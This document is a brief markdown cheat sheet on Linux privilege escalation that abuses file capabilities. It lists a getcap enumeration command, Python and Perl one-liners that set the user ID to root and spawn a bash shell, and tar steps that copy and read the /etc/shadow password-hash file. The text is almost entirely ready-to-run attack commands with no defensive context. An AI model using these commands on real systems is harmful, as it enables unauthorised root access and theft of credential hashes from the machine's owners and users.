## Capabilities ##

**Python**

Check the Privileges on the machine 
```getcap -r / 2>/dev/null```

See what privlege are givin to a function

```ls -al python3```

If root run exploit

```python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'```

Verify permissions

```id```

**Perl**

```./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";' ```

Verify permissions

`id`

** Tar ** 

Compress the /etc/shadow in the current directory with the help of the tar program

``` ./tar cvf shadow.tar /etc/shadow ``` 

Check for shadow password file

``` ls ```

Extract the shadow.tar and you will get a directory as “etc/shadow”

```./tar -xvf shadow.tar ```

View Password file

```tail -8 etc/shadow```

